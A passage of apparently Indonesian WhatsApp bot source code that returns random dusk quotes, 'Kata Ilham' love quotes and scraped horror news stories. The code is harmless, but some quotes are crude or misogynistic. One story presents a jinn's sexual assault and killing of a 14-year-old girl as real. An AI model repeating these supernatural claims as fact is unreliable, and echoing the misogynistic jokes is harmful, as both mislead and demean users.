"Biarlah kunikmati kepedihan ini. Karena sesungguhnya perasaan perih disebabkan cinta yang terkulai sebelum berbunga, adalah sama sendunya dengan memeram cina itu sendiri selama bertahun-tahun. Bagai senja yang tak kunjung malam.",
"Terkadang senja mengingatkan pada rumah, pada orang-orang yang membuat hati kita rindu untuk pulang.",
"Aku hanyalah kunang-kunang dan engkau hanyalah senja. Saat gelap kita berbagi. Saat gelap kita abadi.",
"Ternyata dia bukan senja, jingganya tak hangatkan luka. Dia hanyalah angin yang sekadar singgah kemudian pergi.",
"Senja yang retak. Kapal-kapal berlayar membawa kenangan. Airmatamu menjelma puisi paling duri, paling angin.",
"Biarlah kunikmati kepedihan ini. Karena sesungguhnya perasaan perih disebabkan cinta yang terkulai sebelum berbunga, adalah sama sendunya dengan memeram cina itu sendiri selama bertahun-tahun. Bagai senja yang tak kunjung malam.",
"Gelisah, menampar tak basah pada senja yang bergeromis. Begitu keringkah ladang pertautan kita hingga tunas harapan enggan tumbuh lagi.",
"Kita hanyalah setitik senja yang kadang indah lalu surut dengan bermuram durja, dunia bagi masa kecil kita hanyalah mainan fana yang terus membumbung, mengitari angkasa dan membuat kita terlena akan keindahannya…",
"Senja mengajarkan kita bahwa sesuatu yang terlihat indah sebagian besar hanya bersifat sementara.",
"Tuhan, bersama tenggelamnya matahari senja ini,redakanlah kekecewaan dan kemarahan di hati ini. Sabarkanlah aku. Aamiin.",
"Jika kamu merindukan seseorang, tataplah matahari sore. Kirimkan pesan rindumu untuknya lewat senja.",
"Berdiri di bawah langit di tengah hujan tak membuatku gentar. Aku percaya, tiada hari yang indah saat senja berada di pelupuk mata.",
"Senja tak pernah salah. Hanya kenanganlah yang kadang membuatnya basah. Dan pada senja, akhirnya kita mengaku kalah.",
"Tuhan, bersama tenggelamnya matahari senja ini,redakanlah kekecewaan dan kemarahan di hati ini. Sabarkanlah aku. Aamiin.",
"Ingat, setia itu memang sulit, tapi lihatlah jingga. Selalu menggenapkan warnanya, demi senja di setiap harinya.",
"Disetiap senja, aku ingin melukis langit dengan warna mata kita: warna merah kerinduan.",
"Sekalipun hanya sejenak, Namun senja pergi meninggalkan rasa hidup ini amat teramat singkat. Titipkanlah asa.",
"Jika pena berganti rupa menjadi daun senja, biarlah dia mengering, lalu tersapu angin, sendiri dan dibiarkan oleh sepi.",
"Senja tak pernah salah hanya kenangan yang membuatnya basah.",
"Layung senja telah mencuatkan sinar indahnya. Akan tetapi, kenapa kamu masih saja tetap di posisi yang sama dan dengan perasaan yang sama.",
"Jika kamu merindukan seseorang, tataplah matahari sore. Kirimkan pesan rindumu untuknya lewat senja.",
"Tangannya menjadi pengganti tanganku untuk menuntunmu' Pundaknya menjadi pengganti pundakku untukmu bersandar. Biarlah gemercik gerimis, carik senja, secangkir teh, dan bait lagu menjadi penggantimu.",
"Satu hal yang tak bisa tenggelam bersama kedatangan senja. Itu adalah rasa.",
"Senja lebih tau bagaimana cara mengungkapkan rindu tanpa diketahui oleh angin dan juga derai nafas yang menderu.",
"Maka siluetkan tubuhmu berlatar senja, karena tak sanggup kulihat airmatamu, kekasih.",
"Begini rasanya harihari di linimasa. Wajahmu; 140 huruf yang terus menguntitku tanpa jarak hingga senja lesap dalam kita."
]
const katasenja = senja[Math.floor(Math.random() * senja.length)]
m.reply(`${katasenja}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'katailham': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const ilham = [
 "Nggak ada yang peduli denganmu di sosmed kecuali kamu cakep - Kata ilham.",
 "Sesimpel ini deh, sibuk itu palsu, semua tergantung prioritas  – kata ilham.",
  "Dia hanya menghargaimu, bukan mencintaimu – kata ilham.",
  "Keadilan sosial hanya berlaku bagi warna negara yang good looking – kata ilham.",
  "Jangan jadi pelangi untuk orang yang buta warna – kata ilham.",
  "Dia yang tertidur nyenyak setelah mematahkan hatimu tidak pantas untuk kamu ingat – kata ilham.",
  "Dia cuman bercanda, harusnya kamu ketawa, bukan malah jatuh cinta – kata ilham.",
  "Mencintaimu adalah seni menyakiti diri – kata ilham.",
  "Jika tidak bisa mewarnai hidup seseorang, maka jangan pudarkan warna aslinya ” – kata ilham.",
  "Cukup tahu namaku, jangan rupaku – kata ilham.",
  "Jangan mengeluh ketika kopimu dingin, dia pernah hangat namun kau diamkan - Kata Ilham",
  "Dunia mulai tidak asik karena semua memandang materi dan fisik",
  "Jangan terlalu mencintai manusia yang akan membuatmu melupakan sang pencipta - Kata Ilham",
  "Dunia mulai tidak asik karena semua memandang materi dan fisik",
  "Mencintai adalah seni menyakiti diri sendiri - Kata Ilham",
  "Cinta itu tidak selalu melekat pada kebersamaan, tapi melekat pada doa doa yang di sebutkan dalam diam - Kata Ilham",
  "Dia hanya ingin ditemani, bukan dilengkapi apalagi di miliki - Kata Ilham",
  "Mencintai adalah seni menyakiti diri sendiri - Kata Ilham",
  "Ayo sadar, pesanmu saja di abaikan apalagi perasaanmu - Kata Ilham",
  "Dia tidak mencintaimu dia hanya kesepian, dan kebetulan ada kamu - Kata Ilham",
  "Ingat kalau bercinta jangan ragu-ragu suka ngungkapin, Tolak cari lagi - Kata Ilham",
  "Pacar orang adalah pacar kita juga, Karna kita adalah orang - Kata Ilham",
  "Jangan pernah percaya kata-kata wanita selain ibumu - Kata Ilham",
  "Dunia mulai tidak asik karena semua memandang materi dan fisik",
  "Jangan mengeluh ketika kopimu dingin, dia pernah hangat namun kau diamkan - Kata Ilham",
  "Dia nyaman denganmu, Tapi malu dengan fisikmu - Kata Ilham",
  "Kalo ga suka bilang jangan tiba tiba ngilang - Kata Ilham",
  "Semesta hanya mengizinkanmu untuk mencintainya, bukan untuk memilikinya - Kata Ilham",
  "Cukup tahu namaku, jangan rupaku - Kata Ilham",
  "Ngetik itu pakai jari, Bukan pakai perasaan - Kata Ilham",
  "Kalo tidak bisa memiliki mengapa tidak mencoba menghamili - Kata Ilham",
  "Dia hanya bercanda, harusnya kamu tertawa bukan jatuh cinta - Kata Ilham",
  "Jangan mencari yang sempurna ingat ini dunia ,bukan surga - Kata Ilham",
  "Jangan pernah percaya kata-kata wanita selain ibumu - Kata Ilham",
  "Cinta itu tidak selalu melekat pada kebersamaan, tapi melekat pada doa doa yang di sebutkan dalam diam - Kata Ilham",
  "Ayo sadar, pesanmu saja di abaikan apalagi perasaanmu - Kata Ilham",
  "Jangan terlalu berharap, kamu hanya mencintainya tapi bukan di cintai - Kata ilham",
  "Pada akhirnya kita akan dilupakan, dan akan diingat kembali ketika dia merasakan kesepian - Kata Ilham",
  "Ingat dia cuma balas chatmu, bukan balas perasaanmu - Kata Ilham",
  "Jangan mengeluh ketika kopimu dingin, dia pernah hangat namun kau diamkan - Kata Ilham",
  "Jangan pernah menjadi pelangi untuk orang buta warna - Kata Ilham",
  "Tidurlah hari mulai malamkarna mimpimu lebih indah dari kenyataan - Kata Ilham",
  "Kalo tidak bisa memiliki mengapa tidak mencoba menghamili - Kata Ilham",
  "Ingat kalau bercinta jangan ragu-ragu suka ngungkapin, Tolak cari lagi - Kata Ilham",
  "Ngapain tidur kalau besok bangun lagi - Kata Ilham",
  "Kamu peduli padaku, tapi mencintai orang lain - Kata Ilham",
  "Capek itu wajar tapi menyerah bukan jalan keluar - Kata Ilham",
  "Bukan pemalas, Kita cuma beda jam tidur - Kata Ilham",
  "Sampain detik ini kamu masih menjadi alasan, kenapa hatiku belum mau menerima siapapun :D - Kata Ilham",
  "Jika tidak bisa mewarnai hidup, jangan pudarkan warna aslinya - Kata Ilham",
  "Dia hanya ingin ditemani, bukan dilengkapi apalagi di miliki - Kata Ilham",
  "Sesuatu akan terasa berharga jika sudah kehilangan – kata ilham.",
  "Jangan sok gaul, Ingat Salah pergaulan gendong anak - Kata Ilham",
  "Pada akhirnya kita akan dilupakan, dan akan diingat kembali ketika dia merasakan kesepian - Kata Ilham",
  "Kamu peduli padaku, tapi mencintai orang lain - Kata Ilham",
  "Dia hanya bercanda, harusnya kamu tertawa bukan jatuh cinta - Kata Ilham",
  "Kalo tidak bisa memiliki mengapa tidak mencoba menghamili - Kata Ilham",
  "Jangan pernah menjadi pelangi untuk orang buta warna - Kata Ilham",
  "Dia tidak mencintaimu dia hanya kesepian, dan kebetulan ada kamu - Kata Ilham",
  "Dia cuma mampir seharusnya kamu sediakan kopi bukan hati - Kata Ilham",
  "Jangan mencari yang sempurna ingat ini dunia ,bukan surga - Kata Ilham",
  "Capek itu wajar tapi menyerah bukan jalan keluar - Kata Ilham",
  "Dunia mulai tidak asik karena semua memandang materi dan fisik",
  "Pacar orang adalah pacar kita juga, Karna kita adalah orang - Kata Ilham",
  "Jangan terlalu berharap, kamu hanya mencintainya tapi bukan di cintai - Kata ilham",
  "Jangan pernah mengeluh ketika kopimu dingin, ia pernah hangat, namun kau diamkan – kata ilham."
]
const katailham = ilham[Math.floor(Math.random() * ilham.length)]
m.reply(`${katailham}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'ceritahoror': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const horor = [ {
    "judul": "Pulang dari Study Tour Langsung Tidur, Gadis Ini Tak Sadar Ditemani Kuntilanak",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/11/10/151992/664xauto-pulang-dari-study-tour-langsung-tidur-gadis-tak-sadar-ditemani-kuntilanak-201110g.jpg",
    "desc": "\nDia tidur sambil peluk guling tapi ada 'guling' lain di belakang saat terbangun.\nDream - Membaca cerita horor memang membuat siapa saja jadi merinding. Terlebih jika mengalaminya sendiri.\nSeperti yang dialami oleh gadis cantik bernama Syila yang membagikan cerita horornya melalui video TikTok.\nMenggunakan akun @cabe_rawit2, syila mengaku pernah mengalami kejadian horor saat masih kelas 3 SMA.\n\n",
    "story": "Waktu itu, kelasnya baru saja pulang dari mengadakan study tour. Namun dia tidak menyebutkan lokasinya.\nKatanya, saat pulang dari study tour waktu sudah menunjukkan pukul dua pagi. Dia pulang ke rumah diantar teman cowoknya.\nSaat sudah sampai rumahnya, Syila merasa sangat kecapekan. Dia tidak sempat membersihkan diri, tapi langsung masuk kamar dan tidur.Dia ingat betul saat tidur itu, dia memeluk guling tapi menghadap ke kanan. Setelah sekian lama tertidur, tiba-tiba dia mendengar ada yang menertawakannya.\n© Video TikTok\n\" Tiba2 di belakang gue ada kaya semacam guling yang ngetawain gue, karna gue set sadar gue pukul tuh sambil gue marahin...,\"  tulis Syila.Syila memukul 'guling' itu sambil bilang supaya berhenti tertawa karena sangat mengganggu. Apalagi saat itu merasa capek sekali.\nNamun ketika memukul 'guling' tersebut, Syila merasa aneh. Ketika menoleh ke belakang, ternyata itu adalah kuntilanak.\n© Video TikTok\nJadi selama semalam syila secara tidak sadar tidur bersama dengan makhluk gaib tersebut.Postingan Syila ini langsung membuat netizen ketakutan. Mereka menduga kuntilanak itu ikut karena syila langsung tidur setelah pulang malam-malam.\n© Video TikTok\n© Video TikTok\n© Video TikTok\nSumber: TikTok@cabe_rawit2\nkalo rame tar gue ceritain.\n? original sound - couchiephart"
}, {
    "judul": "Pengakuan Penulis Cerita KKN di Desa Penari: Saya Menyesal",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2019/08/31/116265/664xauto-jadi-viral-penulis-cerita-kkn-di-desa-penari-menyesal-1908313.jpg",
    "desc": "\nSi penulis menceritan secara detail bagaimana dia mendapat cerita KKN di Desa Penari yang bikin heboh selama sepekan terakhir. \nDream – Cerita horor KKN di Desa Penari menjadi viral di media sosial selama sepekan terakhir. Menceritakan tentang pengalaman belasan mahasiswa yang menjalani kuliah kerja nyata, KKN Desa Penari ini memancing penasaran tentang keaslian cerita di dalamnya.\nSemenjak menjadi viral, banyak orang mencoba menelusuri lokasi Desan Penari yang disebutkan dalam cerita tersebut. \nKini, sang pencerita memberikan klarifikasi tentang cerita KKN di Desa Penari yang diunggahnya. Melalui akun Youtube Raditya Dika, pemilik akun Twitter @SimpleM81378523 ini menceritakan tentang cerita horor yang dibuatnya tersebut.\nTak disangka, dalam klarifikasinya, si pemilik akun yang sengaja menyembunyikan nama aslilnya itu mengaku menyesal telah mengunggah cerita KKN di Desa Penari tersebut.\n“ Setelah cerita ini viral, saya benar-benar menyesal,” kata Simple Mana dalam rekaman suara yang ditunjukkan di tayangan YouTube Radit, dikutip Dream, Sabtu 31 Agustus 2019.\nSimpleMan bercerita dia mendapatkan kisah itu dari cerita teman ibunya. Kala itu, didengarkan bahwa teman sang ibu—yang dia sebut dengan Mbak Widya—memiliki pengalaman tak menyenangkan saat kuliah di sebuah universitas di dekat pencerita tinggal.\n“ Karena saat itu sedang semangat menulis cerita pengalaman dan teman-teman dekat di Twitter, saya tertarik untuk mengangkat cerita ini,” kata pemilik akun Twitter @ simplem1378523.\n\n",
    "story": "Semula, narsum yang mengetahui cerita pengalaman peserta KKN di Desa Penari ini menolak untuk bercerita. Tapi, pria ini terus membujuk narsum tersebut dengan menjanjikan akan menyamarkan nama orang, lokasi, dan universitas tempat dia kuliah.\nBahkan, cara untuk mengakses lokasi Desa Penari akan dikaburkannya agar tak ada orang yang bisa menebaknya. Pria ini juga memastikan orang-orang tidak penasaran dan mengulik nama lokasi desa penari.\nTapi, cerita itu sudah terlanjur viral dan membuat kehebohan. SimpleMan mengaku bersalah karena masih memberikan clue tempat dan beberapa poin.\n“ Karena sudah terlanjur viral dan semua orang membacanya, ya, sudah. Saya pikir masih bisa untuk tidak menjelaskan lebih jauh cerita ini,” kata dia.Simple Man mengakui, setelah cerita ini viral, ada pihak-pihak yang merasa terganggu, termasuk dirinya. Apalagi sang narsum yang kebetulan juga memiliki media sosial.\nPencerita berkata kepada sang narsum bahwa cepat atau lambat cerita ini akan terbongkar dengan sendirinya.\n“ Saya cuma mengatakan kepada beliau. Cepat atau lambat, akan terbongkar sendiri,” kata dia.Selain ceritanya mengerikan, ada satu hal yang ingin disampaikan Simple Man dalam ceritanya. Pesan tersirat dari cerita-cerita yang dia dengar tentang KKN di desa penari ini, menurut dia, baik.\nDia berpesan kepada pembaca untuk selalu menjaga sikap di mana pun berada.\n“ (Cerita ini) punya pembelajaran yang baik untuk semua yang baca. Saya berharap semua orang belajar, seperti yang saya dengungkan, ‘Di mana bumi dipijak, di situ langit dijunjung’,” kata Simple Man. \n(Sumber: Youtube @radityadika)"
}, {
    "judul": "Viral CCTV Rekam Tukang Sayur Bonceng Kuntilanak Lewat Jembatan Kp. Utan Depok",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/12/17/155277/664xauto-viral-cctv-rekam-kuntilanak-bonceng-tukang-sayur-saat-lewat-jembatan-kp-utan-201217e.jpg",
    "desc": "\nKejadian itu terekam pada 16 Desember 2020 jam 2 dini hari. Cek faktanya!\nDream - Penampakan makhluk halus berhasil terekam kamera CCTV yang terpasang di Kp. Utan, Tangerang Selatan, Banten.\nRekaman sosok wanita berbaju putih dibonceng pengemudi motor terlihat melalui CCTV pada 16 Desember 2020 jam 2 pagi.\nVideo tersebut sempat diunggah akun Facebook Info Depok sebelum diposting ulang di akun Instagram @ndorobeii dan menjadi viral.\n\n",
    "story": "Ceritanya, seorang tukang sayur dorong pergi belanja untuk kulakan di Pasar Citayam dengan naik motor.\nNamun entah kenapa, saat sampai di pasar, tukang sayur yang tak disebutkan namanya itu mendadak muntah-muntah.\nSeseorang di pasar rupanya tahu penyebabnya. Dia kemudian bertanya kepada tukang sayur, dalam perjalanan ke pasar lewat mana?Tukang sayur itu pun menjelaskan jika dia lewat jembatan gantung Kp. Utan. Petugas hansip kemudian meminta rekaman CCTV yang terpasang di wilayah tersebut.\nSaat mengecek rekaman CCTV, orang-orang pada kaget. Ternyata si tukang sayur 'ketempelan' sosok mirip kuntilanak saat lewat Kp. Utan.\nDalam rekaman video, terlihat kuntilanak anak itu membonceng tukang sayur. Padahal, sebelum membelok ke arah jembatan, tidak ada orang yang memboncengnya.Sontak rekaman CCTV ini menjadi viral dan mengundang respons netizen. Dasar warga +62, bukannya merasa ngeri, netizen malah membanjiri postingan itu dengan komentar kocak.\n\" Serem amat... itu tikungan.... g ada separator, klo g hafal tkp, bs nyemplung sak anu² nya.\" \n\" Dan akhirnya, meraka pun hidup bahagia.\" \n\" Andaikan mbak kun punya sosmed.\" \n\" Dah cape jalan cape terbang numpang motor.\" \n\" Klo menurut cerita terakhir ternyata tukang sayur sendiri yg berpakaian Kunti supaya gk di godain penunggu jembatan situ.\" \nFaktanya\nDalam video itu terlihat video versi lengkap dari kisah heboh yang mengatakan kalau tukang sayur bonceng kuntilanak.\nJika dilihat seksama, video dari tampilan depan memperlihatkan pengendara yang diduga tukang sayur itu ternyata tidak sendirian. Di belakangnya juga tampak ada pengendara lain.\nJika video diputar lambat maka terlihat kalau pengendara tersebut membonceng orang, bukan sosok kuntilanak yang sempat dipercaya oleh netizen.Lihat postingan ini di Instagram      \r\nSebuah kiriman dibagikan oleh ???????????????????????????????????? (@ndorobeii)"
}, {
    "judul": "Cerita Pahit Gadis 11 Tahun Menjerit dan Menangis Saban Malam",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2018/07/11/88125/664xauto-anak-gadis-menjerit-dan-menangis-tiap-malam-tak-tahunya-180711x.jpg",
    "desc": "\nPengalaman pahit dirasakan ibu yang punya anak gadis berusia 14 tahun. Tiap malam menjerit dan menangis, kata orang ada jin yang menggaulinya.\nDream - Perbuatan jahat tidak lepas dari jiwa manusia yang cemburu dengan saudara sendiri. Sampai tega melakukan perbuatan syirik tanpa memikirkan hukum agama.\nIni adalah kisah menyedihkan tentang putri seorang ibu di Malaysia yang menjadi korban kedengkian saudaranya sendiri.\nSaudara dari ibu bernama Cik Som itu mengirim jin untuk mengganggu putrinya yang masih berusia 14 tahun.\nMenurut cerita Cik Som, jin berbentuk orang utan jantan itu akan meniduri putrinya 4-5 kali sehari tanpa sadar.\nKisah ini diceritakan kembali oleh Eyah Nordin setelah pulang dari mengantarkan ibunya berobat.\nKata Nordin, Cik Som punya 4 anak yang terdiri dari 3 laki-laki dan 1 perempuan. Namun anak perempuannya yang berusia 14 tahun itu meninggal.\nAnak perempuan Cik Som itu meninggal karena dikawini jin hasil kiriman saudaranya yang merasa iri dan dengki.\nKata Cik Som, putrinya itu awalnya sakit tidak sembuh-sembuh selama berminggu-minggu.\nMenurut ingatan Cik Som, anaknya itu mulai sakit-sakitan setelah menolong seorang teman yang kesurupan di sekolahnya.\nSetelah seminggu, putri Cik Som sakit dan selalu berteriak-teriak sambil menangis setiap malam.\nSaat Cik Som bertanya bagian mana yang sakit, putrinya akan menunjuk area sekitar organ intim.\nKetika diperiksa, organ intim putrinya terlihat seperti orang setelah melahirkan, bengkak dan berdarah.\nCik Som membawa anaknya berobat ke banyak tempat. Tidak itu saja, Cik Som minta doa kesembuhan putrinya kepada setiap orang yang ditemuinya.\n \nBaca Juga:\n\n\n\nBerjerawat Mengerikan, Wanita Ini Mengaku Kena `Ilmu Hitam`\n\nPengalaman Tragis Korban Gendam, Sampai Lupa Ayat Kursi\n\nCerita Wanita 'Diguna-guna' Rekan Kerja Hingga Benci Tunangan\n\nLebah `Utusan` Temukan Motor Curian, Ternyata...\n\nGara-gara Orangtua Percaya Ilmu Hitam, Wajah Anaknya Jadi...\n\nDiancam Disantet Teman Pria, Jawaban Gadis Ini Tak Terduga!\n\nGeger Kirim Santet Lewat Facebook, Hati-hati...\n\nAstagfirullah, Wajah Kena Santet Agar Tak Jadi Menikah\n\n\n\n\n\n",
    "story": "Dream - Cik Som bilang dia sudah bawa anaknya berobat ke banyak tempat, tapi tetap tidak menemukan kesembuhan.\nTapi Allah Maha Penyayang dan Maha Mendengar. Doa Cik Som terjawab ketika salah satu putranya menikah dengan orang Serawak.\nCik Som berkunjung ke rumah putranya di Serawak bersama putrinya yang sedang sakit itu.\nSeperti biasa, saat malam tiba, putrinya berteriak-teriak kesakitan dan kemudian menangis.\nKebetulan di dekat rumah putranya ada seorang ustaz dari Kelantan. Ustaz itu bertanya tentang kondisi putri Cik Som.\nSetelah diberitahu, ustaz itu memperkenalkan keluarga Cik Som kepada temannya di Kelantan.\nTeman ustaz itu mengambil sebutir telur dan memecahkannya di atas piring putih. Setelah itu putih telur berubah menjadi semacam kertas.\nOrang itu pecahkan lagi satu butir telur dan bagian kuningnya membentuk wajah yang mengantarkan barang gaib itu ke putri Cik Som.\nTeman ustaz itu kemudian berkata bahwa orang itu yang membuat putri Cik Som jadi begitu. Ternyata itu adalah saudara Cik Som sendiri.\n\" Anak Ibu sudah dinikahi oleh iblis yang berbentuk orang hutan jantan. Binatang itu besar. Setiap malam anak Ibu akan digauli 4-5 kali baru makhluk itu puas,\"  jelas teman ustaz tersebut.\nBetapa sengsaranya penderitaan putri Cik Som ini. Baru berumur belasan tahun tapi sudah jadi korban kedengkian keluarganya sendiri.Dream - Teman ustaz itu kemudian meminta Cik Som untuk tidak memberitahukan kepada siapa saja kalau sudah tahu pelakunya.\n\" Satu hari dia akan datang dan muncul dengan sendirinya ke hadapan Ibu,\"  kata teman ustaz itu.\nWalaupun sudah berobat ke sana ke sini, penderitaan putri Cik Som semakin buruk. Dia sempat dirawat inap di rumah sakit di Serawak.\nNamun setelah beberapa minggu, dokter meminta Cik Som membawa pulang anaknya karena putrinya sudah tidak bisa bertahan lagi.\nCik Som membawa pulang anaknya ke Johor dan meninggal di sana begitu sampai di rumah.Dream - Saat putrinya dimakamkan, Cik Som melihat pelaku tidak datang. Tapi 3 hari kemudian, orang yang berbuat jahat itu menampakkan batang hidungnya.\nBegitu datang, dia malah menampakkan kebodohannya dengan berkata, \" Sudah puas hati saya.\" \nCik Som membalas, \" Syukur, anakku sudah tenang di alam sana dan tidak ada yang mengganggunya lagi.\" \nTapi orang itu malah makin memperlihatkan dirinya sebagai pelaku perbuatan keji itu dengan mengantarkan, \" Siapa pun jangan pernah berani lagi dengan saya.\" \nJadi ternyata betul bahwa orang itu yang berbuat jahat terhadap putri Cik Som. Secara tidak sadar dia telah mengakui perbuatan kejinya.\nMoral dari cerita ini adalah jauhilah perbuatan syirik sebab Cik Som mengatakan bahwa perbuatan itu akan makan tuan.\n(Sumber: OhBulan.com)"
}, {
    "judul": "Viral Cerita Tetangga Dengar Suara Misterius dari Apartemen yang 2 Tahun Kosong",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/10/21/150308/664xauto-viral-cerita-penghuni-dengar-suara-misterius-dari-apartemen-yang-2-tahun-kosong-201021g.jpg",
    "desc": "\nKisah yang bikin merinding ini masih jadi misteri hingga kini.\nDream - Kisah seram tinggal di apartemen yang sudah lama tak ditempati dibagikan oleh gadis Malaysia bernama Fatin Shafira melalui akun Twitter @ftnshfr.\nFatin mengawali kisahnya saat menerima keluhan dari tetangga kalau mereka mendengar suara berisik dari unit apartemen miliknya setiap tengah malam.\nKeluhan itu disampaikan oleh tetangga Fatin berkali-kali melalui aplikasi WhatsApp.\n\n",
    "story": "Menurut tetangganya, hampir setiap lewat tengah malam mereka mendengar suara TV dinyalakan keras-keras dari unit apartemen Fatin.\n\" Salam, aku adalah tetangga di unit apartemen. Mau tanya apa ada yang tinggal di unit tersebut?\n\" Karena ada orang menyalakan TV kencang-kencang setelah jam 12 malam selama beberapa hari ini.\n\" Mohon diperiksa unit apartemennya, (kenapa tidak memakai headphone saja.) Terima kasih karena sudah mengganggu,\"  tulis tetangga Fatin.Karena merasa penasaran, Fatin dan keluarganya mendatangi unit apartemen yang dibilang horor tersebut.\nNamun setelah memeriksa apartemennya, Fatin tidak menemukan hal yang aneh-aneh. Hanya ada ruangan kosong, yang penuh debu dan kotoran.\nSelain itu, aliran listriknya juga sudah dimatikan. Jadi tidak mungkin semuanya bisa menyala dengan sendirinya.Jadi, untuk sementara Fatin menyimpulkan kalau gangguan yang dialami oleh tetangga itu adalah ulah makhluk halus.\n\" Jadi kami datang ke apartemen dan tidak ada tanda-tanda orang pernah masuk, menggunakan apapun di dalam rumah.\n\" Tidak ada jejak kaki (rumahnya sangat berdebu), colokan listrik tidak ada yang digunakan. Kesimpulan: hantu. sekian,\"  tulis Fatin.Namun Fatin tidak hanya menerima keluhan TV menyala lewat tengah malam, tetangganya di apartemen tersebut juga mengalami gangguan lainnya.\nMereka pernah mendengar orang menyiram toilet dan mandi. Tapi saat diperiksa, kamar mandinya kering sama sekali.\nSelain itu, aliran listrik dan airnya juga sudah lama dimatikan, sehingga tidak mungkin bisa menyala kecuali ada orang yang tinggal.Pagi harinya, ketika Fatin sudah pulang ke rumahnya, dia mendapat pesan lagi dari tetangga yang sama.\nKatanya, tadi malam dia kembali mendengar suara TV dan kipas AC menyala. Sayangnya, Fatin tidak bisa menengok apartemennya karena ada PSBB.\nFatin kembali meyakinkan tetangganya bahwa dia sudah mengganti kunci, mematikan listrik, dan sebagainya. Dia menduga bunyi-bunyian aneh itu dari unit lain.\n\" Sudah ganti kunci, matikan listrik, dan sebagainya. Mungkin berasal dari unit lain? Jangan biarkan hidup diselubungi misteri,\"  sindir Fatin.Hingga saat ini belum terkuak dari mana suara-suara aneh pada tengah malam itu berasal. Yang pasti netizen ikut merinding mendengar cerita Fatin.\n\" Kisah ini memang membuatku merinding. Seperti pepatah lama bilang jika sebuah rumah dibiarkan kosong lebih dari 40 hari, 'makhluk lain' akan datang dan mendiaminya,\"  tulis akun @fahmy2009.\n\" Rumah kalau ditinggal lama harus baca Surah Al-Baqarah dan buat sholat hajat. Seluruh surat ya, Insya Allah 'benda' itu akan pergi tempat lain,\"  tulis akun @marshoulddie.\n\" Ada yang bilang kalau kita mendengar bunyi-bunyian aneh di luar rumah, sebenarnya rumah kita yang mendapat gangguan,\"  tulis akun @AmanysMos.\nSumber: Twitter"
}, {
    "judul": "Pulang dari Study Tour Langsung Tidur, Gadis Ini Tak Sadar Ditemani Kuntilanak",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/11/10/151992/664xauto-pulang-dari-study-tour-langsung-tidur-gadis-tak-sadar-ditemani-kuntilanak-201110g.jpg",
    "desc": "\nDia tidur sambil peluk guling tapi ada 'guling' lain di belakang saat terbangun.\nDream - Membaca cerita horor memang membuat siapa saja jadi merinding. Terlebih jika mengalaminya sendiri.\nSeperti yang dialami oleh gadis cantik bernama Syila yang membagikan cerita horornya melalui video TikTok.\nMenggunakan akun @cabe_rawit2, syila mengaku pernah mengalami kejadian horor saat masih kelas 3 SMA.\n\n",
    "story": "Waktu itu, kelasnya baru saja pulang dari mengadakan study tour. Namun dia tidak menyebutkan lokasinya.\nKatanya, saat pulang dari study tour waktu sudah menunjukkan pukul dua pagi. Dia pulang ke rumah diantar teman cowoknya.\nSaat sudah sampai rumahnya, Syila merasa sangat kecapekan. Dia tidak sempat membersihkan diri, tapi langsung masuk kamar dan tidur.Dia ingat betul saat tidur itu, dia memeluk guling tapi menghadap ke kanan. Setelah sekian lama tertidur, tiba-tiba dia mendengar ada yang menertawakannya.\n© Video TikTok\n\" Tiba2 di belakang gue ada kaya semacam guling yang ngetawain gue, karna gue set sadar gue pukul tuh sambil gue marahin...,\"  tulis Syila.Syila memukul 'guling' itu sambil bilang supaya berhenti tertawa karena sangat mengganggu. Apalagi saat itu merasa capek sekali.\nNamun ketika memukul 'guling' tersebut, Syila merasa aneh. Ketika menoleh ke belakang, ternyata itu adalah kuntilanak.\n© Video TikTok\nJadi selama semalam syila secara tidak sadar tidur bersama dengan makhluk gaib tersebut.Postingan Syila ini langsung membuat netizen ketakutan. Mereka menduga kuntilanak itu ikut karena syila langsung tidur setelah pulang malam-malam.\n© Video TikTok\n© Video TikTok\n© Video TikTok\nSumber: TikTok@cabe_rawit2\nkalo rame tar gue ceritain.\n? original sound - couchiephart"
}, {
    "judul": "12 Tabung Darah Hilang Usai Muncul Penampakan Seram di Balik Tirai RS",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/10/13/149551/664xauto-12-tabung-darah-hilang-usai-muncul-penampakan-seram-di-balik-tirai-rs-201013b.jpg",
    "desc": "\nKejadian seram di ruang pasien demam berdarah itu dialami dokter saat jaga malam mengambil sampel darah.\nDream - Masih jadi misteri. Itulah kata-kata yang sesuai untuk menggambarkan situasi yang dialami oleh dokter ini, ketika 12 tabung darah pasiennya hilang tanpa jejak.\nBerbagi cerita horor itu di Facebook, dokter Kamarul Ariffin Nor Sadan asal Malaysia mengatakan insiden itu terjadi ketika dia bertugas shif malam di ruang pasien demam berdarah.\n\" Malam itu aku bekerja shif malam, mulai jam 9 malam. Jadi, aku perlu ambil darah pasien demam berdarah jam 12 tengah malam dan 6 pagi. Selesai keliling malam, aku mulai mengambil darah. Ketika itu jam menunjukkan pukul 11.55 malam.\n\" Semuanya berjalan lancar dan kini tinggal seorang satu pasien saja yang perlu diambil darahnya. Aku pun mendorong troli yang dilengkapi dengan peralatan untuk prosedur pengambilan sampel darah ke kamar pasien terakhir itu,\"  ceritanya.\n\n",
